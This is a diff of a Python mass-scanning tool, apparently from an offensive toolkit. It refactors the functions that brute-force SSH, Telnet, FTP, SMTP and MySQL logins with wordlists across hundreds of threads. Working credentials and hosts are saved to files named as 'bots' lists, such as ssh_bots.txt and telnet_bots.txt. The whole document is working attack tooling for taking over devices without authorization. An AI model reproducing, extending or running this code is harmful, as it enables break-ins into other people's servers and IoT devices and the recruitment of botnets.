@@ -59,25 +59,34 @@ class iots(threading.Thread):
       username=x.split(':')[0]
       password=x.split(':')[1]
       if wido==True:
-       q=sshwin(ip,username=username,password=password)
+       q=ssh_win(ip,username=username,password=password)
       elif termux==True:
-       q=sshandro(ip,username=username,password=password)
+       q=ssh_andro(ip,username=username,password=password)
       else:
-       q=sshlin(ip,username=username,password=password)
+       q=ssh_linux(ip,username=username,password=password)
       if q==True:
        ip+=':'+username+':'+password
        print (ip)
        write_file(ip,filen)
      except Exception as e: 
       pass
-def IoTssh(threads=100,wl=wordlist,filename='sshbots.txt'):
+def mass_ssh(threads=100,wl=wordlist,filename='ssh_bots.txt'):
  create_file(filename)
  global filen
  filen=filename
  global wordlist
  wordlist=wl
+ thr=[]
  for x in range(threads):
   t=iots().start()
+  thr.append(t)
+ while True:
+  try:
+    time.sleep(.1)
+  except KeyboardInterrupt:
+    break
+ for x in thr:
+     del x
 class iott(threading.Thread):
  def run(self):
   while True:
@@ -102,14 +111,23 @@ class iott(threading.Thread):
        write_file(ip,filen)
      except Exception as e: 
       pass
-def IoTtelnet(threads=500,wl=wordlist,filename='telnetbots.txt'):
+def mass_telnet(threads=500,wl=wordlist,filename='telnet_bots.txt'):
  create_file(filename)
  global filen
  filen=filename
  global wordlist
  wordlist=wl
+ thr=[]
  for x in range(threads):
-  iott().start()
+  t=iott().start()
+  thr.append(t)
+ while True:
+  try:
+    time.sleep(.1)
+  except KeyboardInterrupt:
+    break
+ for x in thr:
+     del x
 class iotf1(threading.Thread):
  def run(self):
   while True:
@@ -133,14 +151,23 @@ class iotf1(threading.Thread):
        write_file(ip,filen)
      except Exception as e: 
       pass
-def IoTftp(threads=100,meth=1,wl=wordlist,filename='ftpbots.txt'):
+def mass_ftp(threads=100,meth=1,wl=wordlist,filename='ftp_bots.txt'):
  create_file(filename)
  global filen
  filen=filename
  global wordlist
  wordlist=wl
+ thr=[]
  for x in range(threads):
-  iotf1().start()
+  t=iotf1().start()
+  thr.append(t)
+ while True:
+  try:
+    time.sleep(.1)
+  except KeyboardInterrupt:
+    break
+ for x in thr:
+     del x
 class iotf2(threading.Thread):
  def run(self):
   while True:
@@ -155,17 +182,26 @@ class iotf2(threading.Thread):
     pass
    if i==True:
      try:
-      if ftpanon(ip)==True:
+      if ftp_anon(ip)==True:
        print (ip)
        write_file(ip,filen)
      except Exception as e: 
       pass
-def IoTftpanon(threads=100,filename='ftpanonbots.txt'):
+def mass_ftp_anon(threads=100,filename='ftp_anon_bots.txt'):
  create_file(filename)
  global filen
  filen=filename
+ thr=[]
  for x in range(threads):
-  iotf2().start()
+  t=iotf2().start()
+  thr.append(t)
+ while True:
+  try:
+    time.sleep(.1)
+  except KeyboardInterrupt:
+    break
+ for x in thr:
+     del x
 class iotsm(threading.Thread):
  def run(self):
   while True:
@@ -189,7 +225,7 @@ class iotsm(threading.Thread):
        write_file(ip,filen)
      except Exception as e: 
       pass
-def IoTsmtp(o,threads=100,wl=wordlist,filename='smtpbots.txt'):
+def mass_smtp(o,threads=100,wl=wordlist,filename='smtp_bots.txt'):
  create_file(filename)
  global filen
  filen=filename
@@ -197,8 +233,17 @@ def IoTsmtp(o,threads=100,wl=wordlist,filename='smtpbots.txt'):
  octet=o
  global wordlist
  wordlist=wl
+ thr=[]
  for x in range(threads):
-  iotsm().start()
+  t=iotsm().start()
+  thr.append(t)
+ while True:
+  try:
+    time.sleep(.1)
+  except KeyboardInterrupt:
+    break
+ for x in thr:
+     del x
 class iotmy(threading.Thread):
  def run(self):
   while True:
@@ -222,14 +267,23 @@ class iotmy(threading.Thread):
        write_file(ip,filen)
      except Exception as e: 
       pass
-def IoTmysql(threads=100,wl=wordlist,filename='mysqlbots.txt'):
+def mass_mysql(threads=100,wl=wordlist,filename='mysql_bots.txt'):
  create_file(filename)
  global filen
  filen=filename
  global wordlist
  wordlist=wl
+ thr=[]
  for x in range(threads):
-  iotmy().start()
+  t=iotmy().start()
+  thr.append(t)
+ while True:
+  try:
+    time.sleep(.1)
+  except KeyboardInterrupt:
+    break
+ for x in thr:
+     del x
 class iotmy2(threading.Thread):
  def run(self):
   s=mysql
@@ -251,11 +305,20 @@ class iotmy2(threading.Thread):
        write_file(ip,filen)
      except Exception as e: 
       pass
-def IoTmysql2(threads=100,wl=wordlist,filename='mysqldefaultbots.txt'):
+def mass_mysql_default(threads=100,wl=wordlist,filename='mysql_default_bots.txt'):
  create_file(filename)
  global filen
  filen=filename
  global wordlist
  wordlist=wl
+ thr=[]
  for x in range(threads):
-  iotmy2().start()
+  t=iotmy2().start()
+  thr.append(t)
+ while True:
+  try:
+    time.sleep(.1)
+  except KeyboardInterrupt:
+    break
+ for x in thr:
+     del x
